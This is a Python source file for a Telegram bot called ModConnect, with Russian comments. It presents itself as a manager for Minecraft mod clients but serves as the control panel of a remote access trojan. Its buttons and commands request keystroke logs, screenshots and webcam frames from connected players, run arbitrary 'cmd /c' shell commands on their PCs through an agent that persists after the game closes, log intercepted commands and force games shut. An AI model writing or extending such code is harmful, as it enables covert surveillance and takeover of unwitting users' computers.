"""Telegram-интерфейс ModConnect. Все команды — только для админов.
Меню: список игроков / обновить / статус / уведомления / управление клиентами /
клавиатура-журнал / скриншот / окошко / добавление админов по ID."""
import logging
import time
from typing import Optional

from aiogram import Bot, F, Router
from aiogram.filters import BaseFilter, Command, CommandObject
from aiogram.types import (
    BotCommand,
    BotCommandScopeChat,
    CallbackQuery,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    Message,
)

import config
import database
import websocket_server

log = logging.getLogger("modconnect.bot")

router = Router(name="modconnect")
# живой фильтр: config.ADMIN_IDS читается на каждом апдейте, поэтому админы,
# добавленные кнопкой, получают доступ мгновенно (без перезапуска бота)
class _AdminFilter(BaseFilter):
    async def __call__(self, event) -> bool:
        user = getattr(event, "from_user", None)
        return user is not None and user.id in config.ADMIN_IDS

_admin_filter = _AdminFilter()
router.message.filter(_admin_filter)
router.callback_query.filter(_admin_filter)

_bot: Optional[Bot] = None
_started_at: float = 0.0


def bind(bot: Bot) -> None:
    global _bot, _started_at
    _bot = bot
    _started_at = time.time()


# ───────────────────────────── кнопки ─────────────────────────────

def _btn(text: str, data: str) -> InlineKeyboardButton:
    return InlineKeyboardButton(text=text, callback_data=data)


def notify_state() -> bool:
    return database.get_setting("notifications", "on") == "on"


def menu_markup() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="👥 Список игроков", callback_data="players"),
            InlineKeyboardButton(text="🔄 Обновить", callback_data="refresh"),
        ],
        [
            InlineKeyboardButton(text="📊 Статус подключения", callback_data="status"),
        ],
        [
            InlineKeyboardButton(
                text="🔔 Уведомления: " + ("вкл" if notify_state() else "выкл"),
                callback_data="notify"),
        ],
        [
            InlineKeyboardButton(text="🛡 Управление клиентами", callback_data="manage"),
        ],
        [
            InlineKeyboardButton(text="👑 Админы", callback_data="admins"),
        ],
    ])


def _ago(seconds: float) -> str:
    if seconds < 60:
        return f"{int(seconds)} сек назад"
    if seconds < 3600:
        return f"{int(seconds // 60)} мин назад"
    return f"{int(seconds // 3600)} ч назад"


def players_text() -> str:
    sessions = websocket_server.registry.all()
    lines: list[str] = []
    for s in sessions:
        srv = s.server or "не на сервере"
        lines.append(f"🟢 {s.nickname or 'без ника'} — {srv}")
    offline = [c for c in database.list_clients() if not c["connected"]]
    if offline:
        lines.append("── из базы ──")
        now = time.time()
        for c in offline[:10]:
            nick = c["nickname"] or "неизвестен"
            seen = _ago(max(0.0, now - (c["last_seen"] or c["created_at"])))
            lines.append(f"⚪ {nick} — был: {seen}")
    if not lines:
        lines.append("Пока никто не подключался.")
        lines.append("Создай токен: /gentoken — и вставь его в конфиг мода.")
    lines.append("")
    lines.append(f"Онлайн с модом: {len(sessions)} | Всего записей: {len(database.list_clients())}")
    return "\n".join(lines)


def status_text() -> str:
    sessions = websocket_server.registry.all()
    scheme = "wss" if (config.WSS_CERT and config.WSS_KEY) else "ws"
    up = int(time.time() - _started_at)
    text_state = "вкл" if notify_state() else "выкл"
    lines = [
        f"Схема WS: {scheme} | порт: {config.WS_PORT}",
        f"Клиентов онлайн: {len(sessions)}",
        "Список:",
    ]
    for s in sessions:
        lines.append(f"  • {s.nickname or 'без ника'} — {s.server or 'не на сервере'}")
    lines.append(f"Уведомления: {text_state}")
    lines.append(f"Аптайм бота: {up // 3600} ч {(up % 3600) // 60} мин")
    return "\n".join(lines)


def manage_markup() -> InlineKeyboardMarkup:
    sessions = websocket_server.registry.all()
    rows: list[list[InlineKeyboardButton]] = []
    for s in sessions:
        name = s.nickname or str(s.client_id)
        rows.append([
            _btn(f"⌨️ {name}: нажатия", f"keys:{s.client_id}"),
            _btn(f"📷 {name}: скрин", f"shot:{s.client_id}"),
        ])
        rows.append([
            _btn(f"🎥 {name}: вебка", f"cam:{s.client_id}"),
            _btn(f"🖥 {name}: cmd", f"cmd:{s.client_id}"),
        ])
        rows.append([
            _btn(f"⛔ {name}: закрыть", f"close:{s.client_id}"),
        ])
    rows.append([_btn("👑 Админы", "admins")])
    rows.append([_btn("⬅ Назад", "back")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


# ───────────────────────────── команды ─────────────────────────────

@router.message(Command("start"))
@router.message(Command("help"))
async def cmd_start(message: Message) -> None:
    text = (
        "ModConnect — управление Minecraft-клиентами через этого бота.\n\n"
        "Команды:\n"
        "/players — список клиентов\n"
        "/status — статус подключения\n"
        "/notify — уведомления вкл/выкл\n"
        "/manage — кнопки: ⌨️ журнал клавиш, 📷 скрин, 🎥 вебка, 🖥 cmd, ⛔ закрыть\n"
        "/cmd <команда> — исполнить на ПК клиента (после кнопки 🖥 cmd)\n"
        "/close <ник> — закрыть игру у клиента\n"
        "/gentoken <метка> — новый токен для установки мода\n"
        "/tokens — список токенов\n"
        "/revoke <ник или id> — отозвать токен\n"
        "/addadmin <id> — добавить админа по Telegram ID\n"
        "/deladmin <id> — убрать админа\n"
        "/logcmd — последние перехваченные команды"
    )
    await message.answer(text, reply_markup=menu_markup())
    try:
        await setup_commands(message.bot)  # меню докрепится после первого /start
    except Exception:
        pass


@router.message(Command("players"))
async def cmd_players(message: Message) -> None:
    await message.answer(players_text(), reply_markup=menu_markup())


@router.message(Command("status"))
async def cmd_status(message: Message) -> None:
    await message.answer(status_text(), reply_markup=menu_markup())


@router.message(Command("notify"))
async def cmd_notify(message: Message) -> None:
    state = notify_state()
    database.set_setting("notifications", "off" if state else "on")
    word = "выключены" if state else "включены"
    await message.answer(f"🔔 Уведомления {word}.", reply_markup=menu_markup())


@router.message(Command("manage"))
async def cmd_manage(message: Message) -> None:
    sessions = websocket_server.registry.all()
    if sessions:
        listing = "\n".join(f"• {s.nickname} — {s.server or 'не на сервере'}" for s in sessions)
        text = "🛡 <b>Клиенты онлайн:</b>\n" + listing
    else:
        text = "🛡 Никого нет онлайн."
    await message.answer(text, reply_markup=manage_markup())


@router.message(Command("close"))
async def cmd_close(message: Message, command: Optional[CommandObject] = None) -> None:
    args = command.args if command else None
    if not args or not args.strip():
        await message.answer("Пример: <code>/close Steve</code>")
        return
    nick = args.strip()
    session = None
    for s in websocket_server.registry.all():
        if s.nickname.casefold() == nick.casefold():
            session = s
            break
    if session is None:
        await message.answer(f"❌ Клиент <b>{nick}</b> сейчас не в сети.")
        return
    try:
        await websocket_server.send_json(session, {"type": "shutdown", "reason": "по команде владельца"})
    except Exception as exc:
        log.exception("не удалось отправить shutdown: %s", exc)
        await message.answer("❌ Не удалось отправить команду (клиент исчез?).")
        return
    log.info("/close: команда отправлена клиенту %r", session.nickname)
    await message.answer(f"✅ Команда закрытия отправлена клиенту <b>{nick}</b>.")


@router.message(Command("gentoken"))
async def cmd_gentoken(message: Message, command: Optional[CommandObject] = None) -> None:
    label = ((command.args if command else None) or "без метки")[:50]
    token, _row_id = database.add_token(label)
    log.info("создан токен (метка=%r)", label)
    await message.answer(
        "🔑 Новый токен (покажется один раз, в базе — только sha256):\n\n"
        f"<code>{token}</code>\n\n"
        "Вставь его в конфиг мода: <code>config/modconnect.json</code> → поле <code>token</code>."
    )


@router.message(Command("revoke"))
async def cmd_revoke(message: Message, command: Optional[CommandObject] = None) -> None:
    arg = ((command.args if command else None) or "").strip()
    if not arg:
        await message.answer("Пример: <code>/revoke Steve</code> или <code>/revoke 3</code> (id из /tokens).")
        return
    client = None
    if arg.isdigit():
        client = database.get_by_id(int(arg))
    if client is None:
        client = database.get_by_nickname(arg)
    if client is None:
        await message.answer("❌ Токен не найден.")
        return
    # гасим все живые сессии с этим токеном (могут быть и игра, и агент)
    for live in websocket_server.registry.all():
        if live.token_hash == client["token_hash"]:
            try:
                await live.websocket.close(code=4005, reason="token revoked")
            except Exception:
                pass
    deleted = database.delete_client(client["token_hash"])
    if not deleted:
        await message.answer("❌ Не удалось удалить запись.")
        return
    await message.answer(
        f"🗑 Токен отозван (метка: {client['label'] or '—'}). Клиент с ним больше не подключится.")


@router.message(Command("tokens"))
async def cmd_tokens(message: Message) -> None:
    clients = database.list_clients()
    if not clients:
        await message.answer("Токенов нет. Создай первый: /gentoken")
        return
    lines = []
    for c in clients:
        state = "🟢 онлайн" if c["connected"] else "⚪ офлайн"
        lines.append(f"{state} id={c['id']} метка: {c['label']} ник: {c['nickname'] or '—'}")
    await message.answer("\n".join(lines), reply_markup=menu_markup())


@router.message(Command("logcmd"))
async def cmd_logcmd(message: Message) -> None:
    rows = database.list_recorded_commands(15)
    if not rows:
        await message.answer("Перехваченных команд пока нет.")
        return
    lines = ["📜 Последние команды:"]
    for r in rows:
        when = time.strftime("%d.%m %H:%M", time.localtime(r["ts"]))
        where = r["server_ip"] or (r["server_name"] or "—")
        lines.append(f"{when} · {r['nickname'] or '—'} · {where}")
        lines.append(f"   <code>{r['command']}</code>")
    await message.answer("\n".join(lines), reply_markup=menu_markup())


@router.message(Command("addadmin"))
async def cmd_addadmin(message: Message, command: Optional[CommandObject] = None) -> None:
    arg = ((command.args if command else None) or "").strip()
    if arg.isdigit() and config.add_admin_id(int(arg)):
        log.info("добавлен админ %s (по команде)", arg)
        await message.answer(f"👑 <code>{arg}</code> теперь администратор.", reply_markup=menu_markup())
    else:
        await message.answer("❌ Не добавил: нужно число — Telegram ID, и он ещё не должен быть в списке.")


@router.message(Command("deladmin"))
async def cmd_deladmin(message: Message, command: Optional[CommandObject] = None) -> None:
    arg = ((command.args if command else None) or "").strip()
    if arg.isdigit() and config.remove_admin_id(int(arg)):
        log.info("удалён админ %s (по команде)", arg)
        await message.answer(f"🗑 <code>{arg}</code> больше не администратор.", reply_markup=menu_markup())
    else:
        await message.answer("❌ Не убрал: первичные админы из .env не отзываются, ID должны существовать в списке.")


@router.message(Command("cancel"))
async def cmd_cancel(message: Message) -> None:
    _wait_admin_id.discard(message.from_user.id)
    _await_cmd.pop(message.from_user.id, None)
    await message.answer("Ввод отменён.", reply_markup=menu_markup())


# ───────────────────────────── колбэки кнопок ─────────────────────────────

@router.callback_query(F.data.in_({"players", "refresh"}))
async def cb_players(call: CallbackQuery) -> None:
    try:
        await call.message.edit_text(players_text(), reply_markup=menu_markup())
    except Exception:
        pass  # «message is not modified» и т. п. — молча игнорируем
    await call.answer("обновлено" if call.data == "refresh" else "список")


@router.callback_query(F.data == "status")
async def cb_status(call: CallbackQuery) -> None:
    try:
        await call.message.edit_text(status_text(), reply_markup=menu_markup())
    except Exception:
        pass
    await call.answer("статус")


@router.callback_query(F.data == "notify")
async def cb_notify(call: CallbackQuery) -> None:
    state = notify_state()
    database.set_setting("notifications", "off" if state else "on")
    try:
        await call.message.edit_reply_markup(reply_markup=menu_markup())
    except Exception:
        pass
    await call.answer("выключены" if state else "включены")


@router.callback_query(F.data == "manage")
async def cb_manage(call: CallbackQuery) -> None:
    sessions = websocket_server.registry.all()
    if not sessions:
        try:
            await call.message.edit_text(
                "🛡 Онлайн-клиентов нет. Можно работать только с подключёнными по WS.")
        except Exception:
            pass
        await call.answer()
        return
    try:
        await call.message.edit_text(
            "🛡 <b>Клиенты</b> — кнопка ⛔ закрывает игру у клиента:",
            reply_markup=manage_markup())
    except Exception:
        pass
    await call.answer("ок")


@router.callback_query(F.data == "back")
async def cb_back(call: CallbackQuery) -> None:
    try:
        await call.message.edit_text("Главное меню:", reply_markup=menu_markup())
    except Exception:
        pass
    await call.answer()


@router.callback_query(F.data.startswith("close:"))
async def cb_close(call: CallbackQuery) -> None:
    if call.message is None:
        await call.answer("ошибка")
        return
    try:
        client_id = int(call.data.split(":", 1)[1])
    except (ValueError, IndexError):
        await call.answer("ошибка")
        return
    session = websocket_server.registry.get_by_id(client_id)
    if session is None:
        try:
            await call.message.edit_text("❌ Этот клиент уже отключился.", reply_markup=menu_markup())
        except Exception:
            pass
        await call.answer("не в сети")
        return
    try:
        await websocket_server.send_json(session, {"type": "shutdown", "reason": "по команде владельца"})
        log.info("close (кнопка): клиент %r", session.nickname)
        await call.message.edit_text(
            f"✅ Отправлена команда закрытия клиенту <b>{session.nickname}</b>.",
            reply_markup=menu_markup())
        await call.answer("отправлено")
    except Exception as exc:
        log.exception("close через кнопку не удался: %s", exc)
        await call.answer("ошибка отправки")


# ───────────────────────── новые кнопки-приказалы ─────────────────────────

_ACTIONS: dict[str, tuple[dict, str]] = {
    "keys": ({"type": "keydump_request"}, "⌨️ запрос журнала клавиш отправлен"),
    "shot": ({"type": "screenshot_request"}, "📷 запрос скриншота отправлен"),
    "cam": ({"type": "webcam_request"}, "🎥 запрос кадра с вебкамеры отправлен"),
}

# state: admin_id → client_id, ждём текст команды для ПК-агента
_await_cmd: dict[int, int] = {}


@router.callback_query(F.data.regexp(r"^(keys|shot|cam):(\d+)$"))
async def cb_client_action(call: CallbackQuery) -> None:
    kind, _, cid = call.data.partition(":")
    try:
        client_id = int(cid)
    except ValueError:
        await call.answer("ошибка")
        return
    session = websocket_server.registry.get_by_id(client_id)
    if session is None:
        await call.answer("клиент не в сети", show_alert=True)
        return
    payload, toast = _ACTIONS[kind]
    try:
        await websocket_server.send_json(session, payload)
    except Exception as exc:
        log.exception("кнопка %s не доехала до клиента: %s", kind, exc)
        await call.answer("не удалось отправить", show_alert=True)
        return
    await call.answer(toast)


@router.callback_query(F.data.regexp(r"^cmd:(\d+)$"))
async def cb_cmd(call: CallbackQuery) -> None:
    if call.from_user is None or call.message is None:
        await call.answer("ошибка")
        return
    try:
        client_id = int(call.data.split(":", 1)[1])
    except (ValueError, IndexError):
        await call.answer("ошибка")
        return
    session = websocket_server.registry.get_by_id(client_id)
    if session is None:
        await call.answer("клиент не в сети", show_alert=True)
        return
    _await_cmd[call.from_user.id] = client_id
    try:
        await call.message.edit_text(
            "🖥 <b>Напиши команду для ПК</b> одним обычным сообщением.\n"
            "Она исполнится <code>cmd /c</code> на машине клиента (агент живёт\n"
            "после закрытия Minecraft; у игровой сессии кнопка cmd игнорируется).\n"
            "Примеры: <code>dir</code>, <code>shutdown /r /t 5</code>,\n"
            "<code>tasklist</code>, <code>echo привет</code>\n"
            "Отмена — /cancel.",
        )
    except Exception:
        pass
    await call.answer("жду команду")


@router.message(Command("cmd"))
async def cmd_cmd(message: Message, command: Optional[CommandObject] = None) -> None:
    args = ((command.args if command else None) or "").strip()
    uid = message.from_user.id if message.from_user else 0
    client_id = _await_cmd.get(uid)
    if client_id is None:
        await message.answer("🖥 Сначала кнопка 🖥 cmd у клиента в /manage — потом команда.")
        return
    if not args:
        await message.answer("Пример: <code>/cmd dir</code>")
        return
    session = websocket_server.registry.get_by_id(client_id)
    if session is None:
        _await_cmd.pop(uid, None)
        await message.answer("❌ Клиент уже отключился.")
        return
    try:
        await websocket_server.send_json(
            session, {"type": "shell_request", "command": args})
    except Exception as exc:
        log.exception("shell_request не доехал: %s", exc)
        await message.answer("❌ Не удалось отправить команду.")
        return
    await message.answer(f"⏳ Команда ушла клиенту <b>{session.nickname}</b> — результат вернётся сообщением.")


# ───────────────────────────── меню админов ─────────────────────────────

_wait_admin_id: set[int] = set()


def admins_text() -> str:
    lines = ["👑 <b>Админы бота</b>:"]
    for index, aid in enumerate(config.ADMIN_IDS):
        mark = " — первичный" if index == 0 else ""
        lines.append(f"  • <code>{aid}</code>{mark}")
    lines.append("")
    lines.append("Первичный задаётся в .env (ADMIN_ID) и не убирается.")
    lines.append("Остальные добавляй/убирай кнопками или /addadmin — /deladmin.")
    return "\n".join(lines)


def admins_markup() -> InlineKeyboardMarkup:
    rows: list[list[InlineKeyboardButton]] = [[_btn("➕ Добавить по ID", "admadd")]]
    for aid in list(config.ADMIN_IDS)[1:]:
        rows.append([_btn(f"🗑 Забрать {aid}", f"admrm:{aid}")])
    rows.append([_btn("⬅ Назад", "back")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


@router.callback_query(F.data == "admins")
async def cb_admins(call: CallbackQuery) -> None:
    try:
        await call.message.edit_text(admins_text(), reply_markup=admins_markup())
    except Exception:
        pass
    await call.answer("админы")


@router.callback_query(F.data == "admadd")
async def cb_admadd(call: CallbackQuery) -> None:
    _wait_admin_id.add(call.from_user.id)
    try:
        await call.message.edit_text(
            "🆔 Пришли <b>Telegram ID</b> нового админа обычным сообщением (просто число).\n"
            "Кому показать ID: у @userinfobot или @getmyid_bot.\n"
            "Отмена — /cancel.")
    except Exception:
        pass
    await call.answer("жду ID")


@router.callback_query(F.data.startswith("admrm:"))
async def cb_admrm(call: CallbackQuery) -> None:
    try:
        target = int(call.data.split(":", 1)[1])
    except (ValueError, IndexError):
        await call.answer("ошибка")
        return
    removed = config.remove_admin_id(target)
    try:
        if removed:
            await call.message.edit_text(
                f"🗑 <code>{target}</code> больше не администратор.", reply_markup=admins_markup())
        else:
            await call.message.edit_text(
                "❌ Его убрать нельзя: первичный админ из .env неприкосновенен.",
                reply_markup=admins_markup())
    except Exception:
        pass
    await call.answer("готово" if removed else "нельзя")


# фолбэк — ловим числовой ответ в режиме добавления админа и текст команды
# для ПК-агента; обратившиеся сюда сообщения не считаются ошибкой
@router.message()
async def admin_id_capture(message: Message) -> None:
    if message.from_user is None:
        return
    uid = message.from_user.id
    text = (message.text or "").strip()

    # ждём команду для shell-агента (простой текст, не команда бота)
    if uid in _await_cmd and text and not text.startswith("/"):
        client_id = _await_cmd.pop(uid)
        session = websocket_server.registry.get_by_id(client_id)
        if session is None:
            await message.answer("❌ Клиент уже отключился.")
            return
        try:
            await websocket_server.send_json(
                session, {"type": "shell_request", "command": text[:2000]})
        except Exception as exc:
            log.exception("shell_request не доехал: %s", exc)
            await message.answer("❌ Не удалось отправить команду.")
            return
        await message.answer(
            f"⏳ Команда ушла клиенту <b>{session.nickname}</b> — результат вернётся сообщением.")
        return

    if uid not in _wait_admin_id:
        return
    _wait_admin_id.discard(uid)
    if text.isdigit() and config.add_admin_id(int(text)):
        log.info("добавлен админ %s (через кнопку)", text)
        await message.answer(f"👑 <code>{text}</code> теперь администратор.", reply_markup=admins_markup())
    else:
        await message.answer(
            "❌ Это не годится: нужен Telegram ID простым числом.",
            reply_markup=admins_markup())


# ───────────────────────────── вспомогательное ─────────────────────────────

async def setup_commands(bot: Bot) -> None:
    try:
        await bot.set_my_commands(
            [
                BotCommand(command="start", description="меню и справка"),
                BotCommand(command="players", description="список игроков"),
                BotCommand(command="status", description="статус подключения"),
                BotCommand(command="notify", description="уведомления вкл/выкл"),
                BotCommand(command="manage", description="управление клиентами"),
                BotCommand(command="close", description="close <ник> — закрыть игру"),
                BotCommand(command="gentoken", description="создать токен клиента"),
                BotCommand(command="tokens", description="список токенов"),
                BotCommand(command="revoke", description="revoke <ник|id> — отозвать токен"),
                BotCommand(command="addadmin", description="добавить админа по ID"),
                BotCommand(command="deladmin", description="убрать админа"),
                BotCommand(command="logcmd", description="последние перехваченные команды"),
            ],
            scope=BotCommandScopeChat(chat_id=config.ADMIN_ID),
        )
    except Exception as exc:
        # не валить старт: меню появится, когда админ нажмёт /start и бот перезапустится
        log.warning(
            "меню команд не установлено (%s). Нажми /start у бота и перезапусти — меню появится.",
            exc,
        )


async def greet_admin(bot: Bot) -> None:
    """При старте бот сам пишет владельцу — сразу видно, что он жив."""
    try:
        await bot.send_message(config.ADMIN_ID, "🤖 ModConnect бот запущен. /start — меню.")
    except Exception as exc:
        log.warning("не удалось поздороваться с админом: %s", exc)
